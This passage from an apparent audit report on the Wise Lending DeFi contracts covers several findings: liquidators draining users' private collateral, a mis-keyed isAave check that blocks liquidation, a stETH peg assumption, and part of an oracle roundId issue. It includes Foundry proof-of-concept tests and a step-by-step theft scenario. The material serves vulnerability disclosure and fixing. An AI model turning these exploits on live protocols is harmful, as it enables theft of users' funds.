When a user deposits in the `WiseLending` contract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.

When a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call to `getFullCollateralETH()` below only the private collateral is returned immediately as full collateral if it is uncollateralized.

[WiseSecurityHelper.sol#L198-L208](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L198C1-L208C10)

```solidity
        ethCollateral = _getTokensInEth(
            _poolToken,
            WISE_LENDING.getPureCollateralAmount(
                _nftId,
                _poolToken
            )
        );

  ❌     if (_isUncollateralized(_nftId, _poolToken) == true) {
            return ethCollateral;
        }
```

In a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. The `calculateWishPercentage()` call calculates this percentage.

[WiseSecurityHelper.sol#L760-L786](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L760-L786)

```solidity
    function calculateWishPercentage( uint256 _nftId, address _receiveToken, uint256 _paybackETH, uint256 _maxFeeETH, uint256 _baseRewardLiquidation
    ) external view returns (uint256)
    {
        uint256 feeETH = _checkMaxFee(
            _paybackETH,
            _baseRewardLiquidation,
            _maxFeeETH
        );

        uint256 numerator = (feeETH + _paybackETH)
            * PRECISION_FACTOR_E18;

        uint256 denominator = getFullCollateralETH(
            _nftId,
            _receiveToken
        );

        return numerator / denominator + 1;
    }
```

The amount to be liquidated, i.e. the amount the liquidator receives, is calculated in [`_calculateReceiveAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L543) using the percentage from `calculateWishPercentage()` and applied to the position's pure collateral first in line 557 below.

It calculates the percentage of the user's normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e. `potentialPureExtraCashout`, is greater than zero and less than the current private balance (`pureCollateral`) in line 576, it is reduced from the private balance.

[WiseCore.sol#L564-L586](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L564C1-L586C10)

```solidity
556:         if (pureCollateralAmount[_nftId][_receiveTokens] > 0) {
557:             receiveAmount = _withdrawPureCollateralLiquidation(
558:                 _nftId,
559:                 _receiveTokens,
560:                 _removePercentage
561:             );
562:         }
563: 
564:         uint256 potentialPureExtraCashout;
565:         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;
566:         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];
567: 
568:         if (pureCollateral > 0 && userShares > 0) {
569:             potentialPureExtraCashout = _calculatePotentialPureExtraCashout(
570:                 userShares,
571:                 _receiveTokens,
572:                 _removePercentage
573:             );
574:         }
575: 
576:         if (potentialPureExtraCashout > 0 && potentialPureExtraCashout <= pureCollateral) {
577:             _decreasePositionMappingValue(
578:                 pureCollateralAmount,
579:                 _nftId,
580:                 _receiveTokens,
581:                 potentialPureExtraCashout
582:             );
583: 
584:             _decreaseTotalBareToken(
585:                 _receiveTokens,
586:                 potentialPureExtraCashout
587:             );
588: 
589:             return receiveAmount + potentialPureExtraCashout;
590:         }
591: 
```

The issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.

Here's how a malicious liquidator can profit and steal user funds:

1. User deposits `$100` worth of WETH in his private balance and `$100` worth of WETH in his normal balance.
2. He uncollateralizes his position and borrows `$70` worth of WBTC.
3. If the price of WBTC he borrowed goes up to `$100`, he can be liquidated.
4. Assuming no liquidation fees, the liquidator pays `$50` WBTC to liquidate `$50` WETH (50%) from the user's private balance leaving `$50`.
5. The 50% is applied to the user's public balance giving `$50`. This is also deducted from the private balance leaving `$0` in the private balance.
6. The liquidator ends up paying only `$50` to earn `$50` extra.

A liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol's bad debt increases.

### Impact

This vulnerability allows the liquidator to steal the user's balance and pay for only a portion of the shares. It has these effects:

1. The user loses funds.
2. The amount of bad debt in the protocol is increased.

### Proof of Concept

The `testStealPureBalance()` test below shows a liquidator earning more than the amount he paid for liquidation.
The test can be put in any test file in the [contracts](https://github.com/code-423n4/2024-02-wise-lending/tree/main/contracts) directory and ran there.

<details>

```solidity
pragma solidity =0.8.24;

import "forge-std/Test.sol";

import {WiseLending, PoolManager} from "./WiseLending.sol";
import {TesterWiseOracleHub} from "./WiseOracleHub/TesterWiseOracleHub.sol";
import {PositionNFTs} from "./PositionNFTs.sol";
import {WiseSecurity} from "./WiseSecurity/WiseSecurity.sol";
import {AaveHub} from "./WrapperHub/AaveHub.sol";
import {Token} from "./Token.sol";
import {TesterChainlink} from "./TesterChainlink.sol";

import {IPriceFeed} from "./InterfaceHub/IPriceFeed.sol";
import {IERC20} from "./InterfaceHub/IERC20.sol";
import {IWiseLending} from "./InterfaceHub/IWiseLending.sol";

import {ContractLibrary} from "./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";

contract WiseLendingTest is Test, ContractLibrary {

  WiseLending wiseLending;
  TesterWiseOracleHub oracleHub;
  PositionNFTs positionNFTs;
  WiseSecurity wiseSecurity;
  AaveHub aaveHub;
  TesterChainlink wbtcOracle;

  // users/admin
  address alice = address(1);
  address bob = address(2);
  address charles = address(3);
  address lendingMaster;

  //tokens
  address wbtc;

  function setUp() public {
    lendingMaster = address(11);
    vm.startPrank(lendingMaster);

    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    
    // deploy oracle hub
    oracleHub = new TesterWiseOracleHub(
      WETH,
      ETH_PRICE_FEED,
      UNISWAP_V3_FACTORY
    );
    oracleHub.setHeartBeat(
      oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat
      1
    );

    // deploy position NFT
    positionNFTs = new PositionNFTs(
        "PositionsNFTs",
        "POSNFTS",
        "app.wisetoken.net/json-data/nft-data/"
    );

    // deploy Wiselending contract
    wiseLending = new WiseLending(
      lendingMaster,
      address(oracleHub),
      address(positionNFTs)
    );

    // deploy AaveHub
    aaveHub = new AaveHub(
      lendingMaster,
      AAVE_ADDRESS,
      address(wiseLending)
    );
    
    // deploy Wisesecurity contract
    wiseSecurity = new WiseSecurity(
      lendingMaster,
      address(wiseLending),
      address(aaveHub)
    );

    wiseLending.setSecurity(address(wiseSecurity));
    // set labels
    vm.label(address(wiseLending), "WiseLending");
    vm.label(address(positionNFTs), "PositionNFTs");
    vm.label(address(oracleHub), "OracleHub");
    vm.label(address(wiseSecurity), "WiseSecurity");
    vm.label(alice, "Alice");
    vm.label(bob, "Bob");
    vm.label(charles, "Charles");
    vm.label(wbtc, "WBTC");
    vm.label(WETH, "WETH");

    // create tokens, create TestChainlink oracle, add to oracleHub
    (wbtc, wbtcOracle) = _setupToken(18, 17 ether);
    oracleHub.setHeartBeat(wbtc, 1);
    wbtcOracle.setRoundData(0, block.timestamp -1);
    // setup WETH on oracle hub
    oracleHub.setHeartBeat(WETH, 60 minutes);
    oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));
    
    // create pools
    wiseLending.createPool(
      PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: wbtc, // btc
        poolMulFactor: 17500000000000000,
        poolCollFactor: 805000000000000000,
        maxDepositAmount: 1800000000000000000000000
      })
    );

    wiseLending.createPool(
      PoolManager.CreatePool({
        allowBorrow: true,
        poolToken: WETH, // btc
        poolMulFactor: 17500000000000000,
        poolCollFactor: 805000000000000000,
        maxDepositAmount: 1800000000000000000000000
      })
    );
  }

  function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {
    Token _token = new Token(uint8(decimals), alice); // deploy token
    TesterChainlink _oracle = new TesterChainlink( // deploy oracle
      value, 18
    ); 
    oracleHub.addOracle( // add oracle to oracle hub
      address(_token), 
      IPriceFeed(address(_oracle)), 
      new address[](0)
    );

    return (address(_token), _oracle);
  }

  function testStealPureBalance() public {
    // deposit WETH in private and public balances for Alice's NFT
    vm.startPrank(alice);
    deal(WETH, alice, 100 ether);
    IERC20(WETH).approve(address(wiseLending), 100 ether);
    uint aliceNft = positionNFTs.reservePosition();
    wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);
    wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);
    
    // deposit for Bob's NFT to provide WBTC liquidity
    vm.startPrank(bob);
    deal(wbtc, bob, 100 ether);
    IERC20(wbtc).approve(address(wiseLending), 100 ether);
    wiseLending.depositExactAmountMint(wbtc, 100 ether);

    // Uncollateralize Alice's NFT position to allow only private(pure)
    // balance to be used as collateral
    vm.startPrank(alice);
    wiseLending.unCollateralizeDeposit(aliceNft, WETH);
    (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);
    uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;
    
    // alice borrows
    uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;
    uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);

    vm.startPrank(lendingMaster);
    // increase the price of WBTC to make Alice's position liquidatable
    wbtcOracle.setValue(20 ether); 
    
    // let charles get WBTC to liquidate Alice
    vm.startPrank(charles);
    uint charlesNft  = positionNFTs.reservePosition();
    uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);
    deal(wbtc, charles, paybackAmount);
    IERC20(wbtc).approve(address(wiseLending), paybackAmount);

    uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);
    uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);
    // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice
    wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);

    uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);
    uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;
    
    // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)
    // WBTC paid plus fees = 110% * wbtcBalanceChange
    // x2WBTCChangePlusFees = 2 * WBTC paid plus fees
    uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;
    
    assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);
  }
}
```

</details>

### Recommended Mitigation Steps

To ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the `_calculateReceiveAmount()` function. We can fix it by moving the check.

[WiseCore.sol#L560-L594](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L560C17-L594)

```solidity
 
+        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {
+            return receiveAmount;
+        }
+
         uint256 potentialPureExtraCashout;
         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;
         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];
         
         ...

 
-        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {
-            return receiveAmount;
-        }
-
         return _withdrawOrAllocateSharesLiquidation(
             _nftId,
             _nftIdLiquidator,
```

### Assessed type

Invalid Validation

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2018540660):**
 > Edge case - if user is about to be liquidated, I think they will make things collateralized to avoid liquidation. Either way we would like to see this as Medium. Fix is already applied. This is also something that's been explored in the hats.finance competition; hence, 564-566 lines came from there etc.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2021005286):**
 > High is appropriate, especially with the PoC demonstrated.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2082900496):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[H-05] Wrong use of `nftID` to check if a `PowerFarm` position is an Aave position](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32), also found by [0xStalin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/220)*

When a `PowerFarm` position is created its `keyId` is used as a key in the `isAave` mapping to indicate if it is an Aave position or not. The `keyId` is the index of the Power Farm NFT linked with the position.

[PendlePowerManager.sol#L129-L130](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerManager.sol#L129C1-L130C1)

```solidity
        isAave[keyId] = _isAave;
```

The `keyId` is also linked with another `nftId`. This other `nftId` is used to hold the `keyId`s Power Farm position in the `WiseLending` contract. They are linked together in the `farmingKeys` mapping of the `MinterReserver` contract.

[MinterReserver.sol#L88C1-L91C46](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PowerFarmNFTs/MinterReserver.sol#L88C1-L91C46)

```solidity
        uint256 keyId = _getNextReserveKey();

        reservedKeys[_userAddress] = keyId;
        farmingKeys[keyId] = _wiseLendingNFT;
```

The issue is the check if a position is an Aave position is done using the `WiseLending` `nftId` instead of the Power Farm's `keyId`. This occurs five times in the code:

It is used in `getLiveDebtRatio()` to know the pool token borrowed so the `borrowShares` can be retrieved.

[PendlePowerFarm.sol#L64-L70](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L64-L70)

```solidity
        uint256 borrowShares = isAave[_nftId]
            ? _getPositionBorrowSharesAave(
                _nftId
            )
            : _getPositionBorrowShares(
                _nftId
        );
```

It is used in `_manuallyPaybackShares()` to know the pool token to pay back.

[PendlePowerFarm.sol#L127-L129](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L127-L129)

```solidity
        if (isAave[_nftId] == true) {
            poolAddress = AAVE_WETH_ADDRESS;
        }
```

It is used in `checkDebtRatio()` to know the pool token borrowed so the `borrowShares` can be retrieved.

[PendlePowerFarmMathLogic.sol#L396-L402](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L396-L402)

```solidity
   ❌    uint256 borrowShares = isAave[_nftId]
            ? _getPositionBorrowSharesAave(
                _nftId
            )
            : _getPositionBorrowShares(
                _nftId
        );
```

It is used in `_coreLiquidation()` to select a token to payback and to know the pool token borrowed so the `borrowShares` can be retrieved.

[PendlePowerFarmLeverageLogic.sol#L575-L590](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L575-L590)

```solidity
   ❌    address paybackToken = isAave[_nftId] == true
            ? AAVE_WETH_ADDRESS
            : WETH_ADDRESS;

        paybackAmount = WISE_LENDING.paybackAmount(
            paybackToken,
            _shareAmountToPay
        );

   ❌    uint256 cutoffShares = isAave[_nftId] == true
            ? _getPositionBorrowSharesAave(_nftId)
                * FIVTY_PERCENT
                / PRECISION_FACTOR_E18
            : _getPositionBorrowShares(_nftId)
                * FIVTY_PERCENT
                / PRECISION_FACTOR_E18;
```

These have the following effects:

- For `getLiveDebtRatio()`, users would get zero when they try to retrieve their debt ratio.
- For `_manuallyPaybackShares()` users won't be able to pay back their shares manually from the `PowerFarm` contract since it'll fetch zero shares as borrow shares.
- The last two instances are used in liquidation and allow a malicious user to have a position that can't be liquidated even though it is eligible for liquidation. The malicious user can:
    1. Create an Aave `PowerFarm` position.
    2. The position becomes eligible for liquidation after some price changes.
    3. Liquidators cannot liquidate the position because the call to `_coreLiquidation` first calls `checkDebtRatio()` which uses the wrong `borrowShares` to calculate the debt ratio and returns true. Thus, causing a revert.

[PendlePowerFarmLeverageLogic.sol#L571C1-L574C1](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L571C1-L574C1)

```solidity
        if (_checkDebtRatio(_nftId) == true) {
            revert DebtRatioTooLow();
        }
```

### Impact

1. Malicious users can open positions that can't get liquidated.
2. Users can't pay back manually when it is an Aave position.
3. `getLiveDebtRatio()` returns zero always when it is an Aave position.

### Proof of Concept

There are 3 tests below and they can all be run in [PendlePowerFarmControllerBase.t.sol](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmControllerBase.t.sol).

- `testAaveGetLiveDebtRatio()` shows that `getLiveDebtRatio()` returns zero.
- `testAaveManuallyPayback()` shows that borrowed tokens can't be paid back using `manuallyPaybackShares()`.
- `testCannotLiquidate()` shows that Aave positions cannot be liquidated.

```solidity
    function testAaveGetLiveDebtRatio() public cheatSetup(true){
        _prepareAave();
        uint256 keyID = powerFarmManagerInstance.enterFarm(
            true,
            1 ether,
            15 ether,
            entrySpread
        );

        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);
        // gets borrow shares of weth instead of aeth
        uint ratio = powerFarmManagerInstance.getLiveDebtRatio(nftId);
        assertEq(ratio, 0);
    }

    function testAaveManuallyPayback() public cheatSetup(true){
        _prepareAave();
        uint256 keyID = powerFarmManagerInstance.enterFarm(
            true,
            1 ether,
            15 ether,
            entrySpread
        );

        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);
        uint borrowShares = wiseLendingInstance.getPositionBorrowShares(nftId, AWETH);
        // tries to payback weth instead of aweth and reverts with an arithmetic underflow
        // since the position has 0 weth borrow shares
        vm.expectRevert();
        powerFarmManagerInstance.manuallyPaybackShares(keyID, borrowShares);
    }
    
    error DebtRatioTooLow();
    function testCannotLiquidate() public cheatSetup(true){
        _prepareAave();
        uint256 keyID = powerFarmManagerInstance.enterFarm(
            true,
            1 ether,
            15 ether,
            entrySpread
        );

        // increase collateral factors to make position eligible for liquidation
        wiseLendingInstance.setPoolParameters(AWETH, 99e16, type(uint256).max); // increasw Wiselending coll factor
        vm.store(address(powerFarmManagerInstance), bytes32(uint(2)), bytes32(uint(99e16))); //increasw PowerFarm coll factor
        assertEq(powerFarmManagerInstance.collateralFactor(), 99e16);

        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);
        uint borrowShares = wiseLendingInstance.getPositionBorrowShares(nftId, AWETH);
        // will revert if it can't be liquidated
        wiseSecurityInstance.checksLiquidation(nftId, AWETH, borrowShares);

        uint nftIdLiquidator = positionNftsInstance.mintPosition();

        vm.expectRevert(DebtRatioTooLow.selector);
        powerFarmManagerInstance.liquidatePartiallyFromToken(nftId, nftIdLiquidator, borrowShares );
    }
```

### Recommended Mitigation Steps

Consider checking if a position is an Aave position using the `keyId` of the position.

[PendlePowerFarm.sol#L64-L70](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L64-L70)

```solidity
-       uint256 borrowShares = isAave[_nftId]
+       uint256 borrowShares = isAave[keyId]
            ? _getPositionBorrowSharesAave(
                _nftId
            )
            : _getPositionBorrowShares(
                _nftId
        );
```

[PendlePowerFarm.sol#L127-L129](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L127-L129)

```solidity
-       if (isAave[_nftId] == true) {
+       if (isAave[keyId] == true) {
            poolAddress = AAVE_WETH_ADDRESS;
        }
```

[PendlePowerFarmMathLogic.sol#L396-L402](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L396-L402)

```solidity
-        uint256 borrowShares = isAave[_nftId]
+        uint256 borrowShares = isAave[keyId]
            ? _getPositionBorrowSharesAave(
                _nftId
            )
            : _getPositionBorrowShares(
                _nftId
        );
```

[PendlePowerFarmLeverageLogic.sol#L575-L590](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L575-L590)

```solidity
-        address paybackToken = isAave[_nftId] == true
+        address paybackToken = isAave[keyId] == true
            ? AAVE_WETH_ADDRESS
            : WETH_ADDRESS;

        paybackAmount = WISE_LENDING.paybackAmount(
            paybackToken,
            _shareAmountToPay
        );

-       uint256 cutoffShares = isAave[_nftId] == true
+       uint256 cutoffShares = isAave[keyId] == true
            ? _getPositionBorrowSharesAave(_nftId)
                * FIVTY_PERCENT
                / PRECISION_FACTOR_E18
            : _getPositionBorrowShares(_nftId)
                * FIVTY_PERCENT
                / PRECISION_FACTOR_E18;
```

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32#issuecomment-2004563704):**
 > While this is marked as High, we would like to bring this to a Medium, as there is still a way to liquidate such nft/user should that even occur (depending if there's AavePool present etc).
> 
> @vonMangoldt can provide details on how this can be mitigated and user can still be liquidated even if they would have a chance to enter with the wrong `isAave` flag.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/32#issuecomment-2082901877):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***
 
# Medium Risk Findings (17)
## [[M-01] Exiting a farm on mainnet assumes a peg of `1:1`  when swapping stETH for ETH](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304)
*Submitted by [0xStalin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304)*

When stETH depegs from ETH, the swaps on Curve will revert due to requesting a higher `amountOut` than what the curves pool will give.

### Proof of Concept

When exiting a farm on mainnet, the requested `tokensOut` is set as `stETH` for redeeming the SY tokens on the `PENDLE_SY` contract. Once the `PowerFarm` has on its balance the `stETH` tokens, [it does a swap from stETH to ETH using the Curves protocol.](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L293-L308)

The problem is that the implementation is assuming a peg of `1 ETH ~= 1 stETH`. Even though both tokens have a tendency to keep the peg, this hasn't been always the case as it can be seen [in this dashboard](https://dune.com/LidoAnalytical/Curve-ETHstETH). There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at `~0.93` ETH.

[When computing the `_minOutAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L194-L199), the `PowerFarm` calculates the `ethValue` of the received stETH tokens by requesting the price of the `WETH` asset, and then it applies the `reverAllowedSpread` to finally determine the `_minOutAmount` of ETH tokens that will be accepted from the swap on Curves.

The WETH price is pegged `1:1` to ETH, 1 WETH will always be 1 ETH, but, using the price of WETH to determine the `minOutAmount` is problematic, because, as seen in the dashboard, historically, `1 stETH has deppeged from 1:1 from ETH`.

Example: Assume a user sets a slippage of 1%. If stETH were to depeg to 0.95 per ETH, when swapping it would try to make sure that the user received at least 0.99 ETH. Whenever trying to swap it will revert because curves can't give the requested `minOutAmount` of ETH tokens, it could give at most 0.95 ETH per stETH.

```
function _logicClosePosition(
    ...
)
    private
{
    ...

    //@audit-info => When exiting a farm on mainnet, the `tokenOut` is set to be `stETH`
    address tokenOut = block.chainid == 1
        ? ST_ETH_ADDRESS
        : ENTRY_ASSET;

    ...

    uint256 ethAmount = _getEthBack(
        tokenOutAmount,
        _getTokensInETH(
            //@audit-info => When exiting a farm on mainnet, the price of the `tokenOut` is requested as if it were the price of `WETH`
            //@audit-issue => Here is where the code assumes a peg of `1 stETH to be 1 ETH`
            block.chainid == 1
                ? WETH_ADDRESS
                : ENTRY_ASSET,
            tokenOutAmount
        )
            * reverseAllowedSpread
            / PRECISION_FACTOR_E18
    );

    ...
}

function _getEthBack(
    uint256 _swapAmount,
    uint256 _minOutAmount
)
    internal
    returns (uint256)
{
    if (block.chainid == ETH_CHAIN_ID) {
        //@audit-info => Does a swap of stETH for ETH on the Curves exchange
        return _swapStETHintoETH(
            _swapAmount,
            _minOutAmount
        );
    }

    ...
}

function _swapStETHintoETH(
    uint256 _swapAmount,
    uint256 _minOutAmount
)
    internal
    returns (uint256)
{
    return CURVE.exchange(
        {
            fromIndex: 1,
            toIndex: 0,
            exactAmountFrom: _swapAmount,
            //@audit-info => minimum amount of ETH that the PowerFarm will accept for swapping `exactAmountFrom` of `stETH` tokens!
            minReceiveAmount: _minOutAmount
        }
    );
}

```

### Tools Used

Referenced [H-06 finding on Asymmetry Finance Solodit audit](https://solodit.xyz/issues/h-06-wsteth-derivative-assumes-a-11-peg-of-steth-to-eth-code4rena-asymmetry-finance-asymmetry-contest-git) and Asymmetry's C4 mitigation review [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13) and [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40).

### Recommended Mitigation Steps

The recommendation would be to implement a mitigation similar to the one implemented on the referenced issues.
Basically, fetch the current price of `stETH` from a Chainlink Oracle and multiply the `minOutAmount` by the current price of `stETH`. In this way, the `minOutAmount` that is sent to the Curves exchange will now be within the correct limits based on the current price of stETH.

Also, make sure to multiply the `ethValueBefore` by the current price of stETH (only when exiting farms on mainnet). In this way, both amounts, `ethValueAfter` and `ethValueBefore` will be computed based on the current price of stETH, allowing the slippage to validate that no `ethValue` was lost during the process of removing liquidity from pendle, redeeming the sy tokens and swapping on curves. In the end, both, `ethValueAfter` and `ethValueBefore` will represent the `ethValue` based on the stETH price.

### Assessed type

Context

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2006301592):**
 > Since we have `ethValueBefore` and after we could also set it to `0` and no harm done, thus invalid.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2021072307):**
 > @vonMangoldt - Would need additional description for the issue described is not actually effective, as from my analysis I can't find a counter-example.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2090371585):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).
>
>Additionally, the team decided to use `PendleRouter` ([here](https://github.com/pendle-finance/pendle-core/blob/master/contracts/core/PendleRouter.sol)) instead of `Curve` moving forward during farm exit.

***

## [[M-02] Chainlink Oracles may return stale prices or may be unusable when aggregator `roundId` is less than 50](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276)*

`WiseLending` calibrates Oracles to get a heartbeat which it uses for checking the staleness of prices returned from the Oracle.

To calibrate, it fetches between 3-50 inclusive historical prices and picks the second largest update time among those prices. It calls `_getIterationCount()` to know the number of historical prices it'll use. If the current `_latestAggregatorRoundId` is less than 50 (`MAX_ROUND_COUNT`) it uses `_latestAggregatorRoundId` else it uses 50.

[OracleHelper.sol#L665-L667](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L665-L667)

            res = _latestAggregatorRoundId < MAX_ROUND_COUNT
                ? _latestAggregatorRoundId
                : MAX_ROUND_COUNT;

The issue with the snippet above is that `_latestAggregatorRoundId` will always be greater than 50 so the number of historical prices it uses will always be 50.

It's always greater than 50 because it is fetched from the aggregator's proxy contract. The `roundId`s returned from the proxy are a combination of the current aggregator's `roundId` and `phaseId`. Check [Chainlink docs](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy) for more info. `getLatestRoundId()` returns the `roundId`.

[OracleHelper.sol#L708-L715](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L708-L715)

```solidity
        (
            roundId
            ,
            ,
            ,
            ,
        ) = priceFeed[_tokenAddress].latestRoundData();
```

The `roundId` returned is used in the `_recalibratePreview()` function below to get previous `roundIds`. The `iterationCount` as we already mentioned will always be 50.

[OracleHelper.sol#L620C1-L630C15](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L620C1-L630C15)

            uint80 i = 1;
            uint256 currentDiff;
            uint256 currentBiggest;
            uint256 currentSecondBiggest;

     ❌      while (i < iterationCount) {

                uint256 currentTimestamp = _getRoundTimestamp(
                    _tokenAddress,
     ❌              latestRoundId - i
                );

The problem with the above call is that the argument, `latestRoundId-1` above may not have valid data for some rounds. So calls to the Chainlink Oracle for those rounds will revert.

This may occur because of the way proxy `roundIds` work.

Example:

- If the proxy returns 0x40000000000000010 as `roundId`.
- The `phaseId` is 4 (`roundId` `>> 64`).
